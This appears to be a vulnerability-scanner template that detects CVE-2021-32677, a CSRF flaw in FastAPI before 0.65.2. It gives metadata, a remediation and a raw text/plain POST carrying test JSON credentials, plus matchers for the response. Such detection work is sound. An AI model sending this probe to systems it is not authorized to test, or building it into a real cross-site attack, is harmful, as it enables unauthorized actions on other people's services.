id: CVE-2021-32677

info:
  name: FastAPI < 0.65.2 - CSRF via text/plain
  author: oxqnd
  severity: medium
  description: |
    FastAPI versions before 0.65.2 parse JSON bodies even when the content-type is text/plain.
    This allows CSRF attacks due to CORS bypass with simple requests.
  impact: |
    Attacker can send forged requests via cross-site forms or scripts to perform unauthorized actions.
  remediation: |
    Upgrade to FastAPI 0.65.2 or later.
  reference:
    - https://github.com/advisories/GHSA-8h2j-cgx8-6xv7
    - https://nvd.nist.gov/vuln/detail/CVE-2021-32677
  classification:
    cve-id: CVE-2021-32677
    cwe-id: CWE-352
    cvss-score: 4.3
  tags: cve,cve2021,fastapi,csrf

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain

        {"username":"csrf_test","password":"csrf_test"}

    matchers:
      - type: word
        words:
          - '"username":"csrf_test"'
          - '"password":"csrf_test"'
        condition: and

      - type: status
        status:
          - 200
